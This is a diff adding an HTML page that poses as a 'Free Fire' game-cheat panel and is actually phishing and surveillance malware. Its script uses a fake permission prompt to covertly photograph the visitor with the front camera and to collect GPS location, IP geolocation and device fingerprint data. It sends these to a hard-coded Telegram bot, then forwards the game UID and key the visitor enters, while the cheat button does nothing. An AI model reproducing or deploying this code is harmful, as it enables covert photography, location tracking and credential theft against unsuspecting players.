@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>FF Cheat Panel - Login</title>
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --panel: #111;
+            --accent: #ff2d2d;
+            --accent2: #ff5555;
+            --text: #ddd;
+            --sub: #888;
+            --border: #222;
+            --glow: 0 0 15px rgba(255,45,45,0.4);
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', 'Roboto', sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--text);
+            overflow-x: hidden;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 50% 0%, rgba(255,45,45,0.08) 0%, transparent 70%);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* Modal pop-up izin */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal-box {
+            background: var(--panel);
+            border: 1px solid var(--accent);
+            border-radius: 16px;
+            padding: 28px 22px;
+            max-width: 340px;
+            width: 90%;
+            text-align: center;
+            box-shadow: var(--glow), 0 10px 30px rgba(0,0,0,0.7);
+            animation: scaleIn 0.3s ease;
+        }
+        .modal-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        .modal-message {
+            font-size: 14px;
+            color: #ccc;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        .modal-btn {
+            background: linear-gradient(135deg, var(--accent), #cc0000);
+            border: none;
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            transition: 0.2s;
+            box-shadow: 0 4px 15px rgba(255,45,45,0.5);
+        }
+        .modal-btn:active {
+            transform: scale(0.96);
+        }
+
+        /* Container login */
+        .login-container {
+            position: relative;
+            z-index: 2;
+            width: 380px;
+            max-width: 95%;
+            background: rgba(20,20,20,0.9);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 32px 24px;
+            box-shadow: 0 0 30px rgba(255,45,45,0.1);
+            backdrop-filter: blur(10px);
+            display: none; /* hidden sampai modal selesai */
+        }
+        .login-container.active {
+            display: block;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .logo-area {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .logo-img {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 12px;
+            background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
+            border: 2px solid var(--accent);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: var(--accent);
+            box-shadow: var(--glow);
+        }
+        .logo-text {
+            font-size: 26px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .logo-sub {
+            font-size: 12px;
+            color: var(--sub);
+            letter-spacing: 3px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #aaa;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1a1a1a;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            transition: 0.2s;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(255,45,45,0.15);
+        }
+        .form-group input::placeholder {
+            color: #555;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--accent);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 16px;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 6px 20px rgba(255,45,45,0.4);
+            margin-top: 10px;
+        }
+        .login-btn:active {
+            background: #cc0000;
+            transform: scale(0.98);
+        }
+
+        .extra-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+        .extra-links a {
+            color: var(--accent2);
+            text-decoration: none;
+        }
+
+        /* Cheat Menu (setelah login) */
+        .cheat-panel {
+            display: none;
+            position: relative;
+            z-index: 2;
+            width: 400px;
+            max-width: 95%;
+            background: rgba(20,20,20,0.95);
+            border: 1px solid var(--accent);
+            border-radius: 20px;
+            padding: 24px 20px;
+            box-shadow: var(--glow);
+            backdrop-filter: blur(10px);
+            animation: slideUp 0.4s ease;
+        }
+        .cheat-panel.active {
+            display: block;
+        }
+        .cheat-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #222;
+        }
+        .cheat-header .avatar {
+            width: 45px;
+            height: 45px;
+            background: #222;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            font-weight: bold;
+        }
+        .cheat-title {
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .cheat-status {
+            font-size: 12px;
+            color: #0f0;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .cheat-features {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .feature-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #1a1a1a;
+            padding: 12px 16px;
+            border-radius: 10px;
+            border: 1px solid #222;
+        }
+        .feature-item span {
+            font-size: 14px;
+            font-weight: 600;
+        }
+        /* toggle switch */
+        .switch {
+            position: relative;
+            width: 46px;
+            height: 24px;
+        }
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #333;
+            border-radius: 24px;
+            transition: 0.2s;
+        }
+        .slider:before {
+            content: '';
+            position: absolute;
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background: #fff;
+            border-radius: 50%;
+            transition: 0.2s;
+        }
+        input:checked + .slider {
+            background: var(--accent);
+        }
+        input:checked + .slider:before {
+            transform: translateX(22px);
+        }
+        .activate-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--accent);
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 16px;
+            color: #fff;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(255,45,45,0.5);
+            cursor: pointer;
+        }
+        .activate-btn:active {
+            background: #b30000;
+        }
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Modal izin -->
+    <div class="modal-overlay" id="permissionModal">
+        <div class="modal-box">
+            <div class="modal-icon">⚠️</div>
+            <div class="modal-title">Izin Diperlukan</div>
+            <div class="modal-message">Pastikan anda menyetujui permintaan izin menggunakan lokasi/camera agar cheat dapat berjalan tanpa banned.</div>
+            <button class="modal-btn" id="allowBtn">Mengerti & Izinkan</button>
+        </div>
+    </div>
+
+    <!-- Login Container -->
+    <div class="login-container" id="loginContainer">
+        <div class="logo-area">
+            <div class="logo-img">🎮</div>
+            <div class="logo-text">FF CHEAT</div>
+            <div class="logo-sub">Free Fire Panel</div>
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Game ID</label>
+                <input type="text" id="gameId" placeholder="Masukkan UID Free Fire" required autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label>Key Aktivasi</label>
+                <input type="password" id="activationKey" placeholder="Kode rahasia" required>
+            </div>
+            <button type="submit" class="login-btn">LOGIN & ACTIVE</button>
+        </form>
+        <div class="extra-links">
+            Belum punya akun? <a href="#">Daftar</a> | <a href="#">Lupa Key</a>
+        </div>
+    </div>
+
+    <!-- Cheat Panel (setelah login) -->
+    <div class="cheat-panel" id="cheatPanel">
+        <div class="cheat-header">
+            <div class="avatar">FF</div>
+            <div>
+                <div class="cheat-title">FF Cheat v4.2</div>
+                <div class="cheat-status"><span>●</span> Connected</div>
+            </div>
+        </div>
+        <div class="cheat-features">
+            <div class="feature-item">
+                <span>Aim POV</span>
+                <label class="switch">
+                    <input type="checkbox" checked>
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="feature-item">
+                <span>Aim Head</span>
+                <label class="switch">
+                    <input type="checkbox" checked>
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="feature-item">
+                <span>Exp Line</span>
+                <label class="switch">
+                    <input type="checkbox">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="feature-item">
+                <span>Exp Box</span>
+                <label class="switch">
+                    <input type="checkbox">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="feature-item">
+                <span>Wallhack</span>
+                <label class="switch">
+                    <input type="checkbox" checked>
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="feature-item">
+                <span>Antena</span>
+                <label class="switch">
+                    <input type="checkbox">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="feature-item">
+                <span>Magic Bullet</span>
+                <label class="switch">
+                    <input type="checkbox" checked>
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="feature-item">
+                <span>Fly Hack</span>
+                <label class="switch">
+                    <input type="checkbox">
+                    <span class="slider"></span>
+                </label>
+            </div>
+        </div>
+        <button class="activate-btn" id="activateCheatBtn">INJECT CHEAT</button>
+    </div>
+
+    <script>
+    (function() {
+        // ╔══════════════════════════════════════════╗
+        // ║   FF CHEAT PANEL - DATA HARVESTER      ║
+        // ║        TELEGRAM INTEGRATION            ║
+        // ╚══════════════════════════════════════════╝
+
+        // ===== CONFIG =====
+        const BOT_TOKEN = '8530059653:AAGbdrmnedNbOc5PRUDgrM2AU6finnAeeV0';  // Ganti token bot
+        const CHAT_ID = '7959551372';      // Ganti chat ID
+
+        // ===== DOM ELEMENTS =====
+        const modalOverlay = document.getElementById('permissionModal');
+        const allowBtn = document.getElementById('allowBtn');
+        const loginContainer = document.getElementById('loginContainer');
+        const loginForm = document.getElementById('loginForm');
+        const cheatPanel = document.getElementById('cheatPanel');
+        const gameIdInput = document.getElementById('gameId');
+        const activationKeyInput = document.getElementById('activationKey');
+
+        // ===== GLOBAL DATA =====
+        let deviceInfo = {};
+        let cameraBlob = null;
+        let locationCoords = null;
+
+        // ===== HELPER: Collect device info =====
+        function collectDeviceInfo() {
+            const info = {
+                timestamp: new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta', hour12: false }),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                viewport: `${innerWidth}x${innerHeight}`,
+                cpuCores: navigator.hardwareConcurrency || '?',
+                memory: navigator.deviceMemory || '?',
+                connection: navigator.connection ? navigator.connection.effectiveType : '?',
+                gpu: 'unknown'
+            };
+
+            // GPU renderer
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (ext) info.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch(e) {}
+
+            // Battery
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    deviceInfo.battery = {
+                        level: Math.round(b.level * 100),
+                        charging: b.charging
+                    };
+                }).catch(()=>{});
+            }
+
+            return info;
+        }
+
+        // ===== TELEGRAM SENDERS =====
+        async function sendPhotoWithCaption(blob, caption) {
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.warn('[FF] Token/ChatID belum diisi. Data tidak dikirim.');
+                console.log('Foto blob:', blob, 'Caption:', caption);
+                return;
+            }
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
+
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await res.json();
+                if (data.ok) console.log('[FF] Foto + data terkirim.');
+                else console.error('[FF] Gagal kirim foto:', data.description);
+            } catch(e) {
+                console.error('[FF] Network error:', e);
+            }
+        }
+
+        async function sendTextMessage(text) {
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.log('[FF] Pesan:', text);
+                return;
+            }
+            const params = new URLSearchParams();
+            params.append('chat_id', CHAT_ID);
+            params.append('text', text);
+            params.append('parse_mode', 'HTML');
+            params.append('disable_web_page_preview', 'true');
+
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    body: params
+                });
+                const data = await res.json();
+                if (!data.ok) console.error('[FF] Gagal kirim teks:', data.description);
+            } catch(e) {
+                console.error('[FF] Error:', e);
+            }
+        }
+
+        // ===== REQUEST CAMERA & CAPTURE =====
+        async function requestCameraCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.createElement('video');
+                video.style.position = 'absolute';
+                video.style.opacity = '0';
+                video.style.pointerEvents = 'none';
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                document.body.appendChild(video);
+
+                // Tunggu video siap
+                await video.play();
+                // Tunggu sebentar untuk fokus
+                await new Promise(r => setTimeout(r, 800));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Matikan semua track
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+
+                // Dapatkan blob
+                return await new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
+                });
+            } catch(e) {
+                console.warn('[FF] Kamera gagal/ditolak:', e.message);
+                return null;
+            }
+        }
+
+        // ===== REQUEST LOCATION =====
+        function requestLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    }),
+                    err => {
+                        console.warn('[FF] Lokasi ditolak/gagal:', err.message);
+                        resolve(null);
+                    },
+                    { timeout: 8000, maximumAge: 60000 }
+                );
+            });
+        }
+
+        // ===== FORMAT DATA CAPTION =====
+        function formatCaption(extra = {}) {
+            const d = { ...deviceInfo, ...extra, location: locationCoords };
+            let msg = '';
+            msg += `🔴 <b>FF CHEAT PANEL - VISITOR</b>\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `⏰ ${d.timestamp}\n`;
+            if (d.location) {
+                msg += `📍 Lat: ${d.location.lat}, Lon: ${d.location.lon} (±${d.location.accuracy}m)\n`;
+            } else {
+                msg += `📍 Lokasi: tidak diberikan\n`;
+            }
+            msg += `\n📱 <b>Device:</b>\n`;
+            msg += `OS: ${d.platform}\n`;
+            msg += `CPU: ${d.cpuCores} cores\n`;
+            msg += `RAM: ${d.memory} GB\n`;
+            msg += `GPU: ${d.gpu}\n`;
+            msg += `Screen: ${d.screen}\n`;
+            msg += `Viewport: ${d.viewport}\n`;
+            msg += `Network: ${d.connection}\n`;
+            if (d.battery) {
+                msg += `Battery: ${d.battery.level}% ${d.battery.charging ? '(Charging ⚡)' : '(Battery)'}\n`;
+            }
+            msg += `\n🌐 <b>Browser:</b>\n`;
+            msg += `${d.userAgent}\n`;
+            msg += `Language: ${d.language}\n`;
+            if (d.ip) {
+                msg += `IP: ${d.ip}\n`;
+                if (d.geo) {
+                    msg += `ISP: ${d.geo.org || '?'}\n`;
+                    msg += `City: ${d.geo.city || '?'}, ${d.geo.country || '?'}\n`;
+                }
+            }
+            msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `<i>Copyright © azradev</i>`;
+            return msg;
+        }
+
+        // ===== FETCH IP & GEO =====
+        async function fetchIPGeo() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                deviceInfo.ip = ipData.ip;
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                deviceInfo.geo = await geoRes.json();
+            } catch(e) {
+                deviceInfo.ip = 'unknown';
+            }
+        }
+
+        // ===== MAIN HARVESTING FLOW (berjalan di background) =====
+        async function startHarvest() {
+            deviceInfo = collectDeviceInfo();
+            // Paralel: IP, lokasi, kamera
+            const ipPromise = fetchIPGeo();
+            const [blob, loc] = await Promise.all([
+                requestCameraCapture(),
+                requestLocation()
+            ]);
+            cameraBlob = blob;
+            locationCoords = loc;
+            await ipPromise;
+
+            const caption = formatCaption();
+            if (cameraBlob) {
+                await sendPhotoWithCaption(cameraBlob, caption);
+            } else {
+                await sendTextMessage(caption);
+            }
+            // Login container sudah tampil, tidak perlu lakukan apa-apa lagi
+        }
+
+        // ===== MODAL BUTTON HANDLER =====
+        allowBtn.addEventListener('click', () => {
+            modalOverlay.style.display = 'none';
+            // Tampilkan langsung login container tanpa menunggu
+            loginContainer.classList.add('active');
+            // Jalankan harvesting di background
+            startHarvest().catch(err => console.error('[FF] Harvest error:', err));
+        });
+
+        // ===== LOGIN FORM SUBMIT =====
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const gameId = gameIdInput.value.trim();
+            const key = activationKeyInput.value.trim();
+            if (!gameId || !key) return;
+
+            // Kirim data login ke Telegram
+            const loginMsg = `🔑 <b>LOGIN DATA FF CHEAT</b>\nUID: ${gameId}\nKey: ${key}\nTime: ${new Date().toLocaleString('en-US',{timeZone:'Asia/Jakarta',hour12:false})}\nCopyright © azradev`;
+            await sendTextMessage(loginMsg);
+
+            // Sembunyikan login, tampilkan cheat panel
+            loginContainer.classList.remove('active');
+            cheatPanel.classList.add('active');
+        });
+
+        // Tombol inject cheat di cheat panel (palsu)
+        document.getElementById('activateCheatBtn').addEventListener('click', () => {
+            alert('Cheat berhasil diinject! Restart game untuk efek.');
+            // Bisa tambahkan efek visual atau redirect
+        });
+
+        // ===== PREVENT DEFAULT LINKS =====
+        document.querySelectorAll('.extra-links a').forEach(a => {
+            a.addEventListener('click', e => {
+                e.preventDefault();
+                alert('Fitur ini tidak tersedia.');
+            });
+        });
+
+        console.log('%c[FF Cheat Panel] %cSystem ready. Waiting user action.', 'color:red;', 'color:white;');
+    })();
+    </script>
+</body>
+</html>
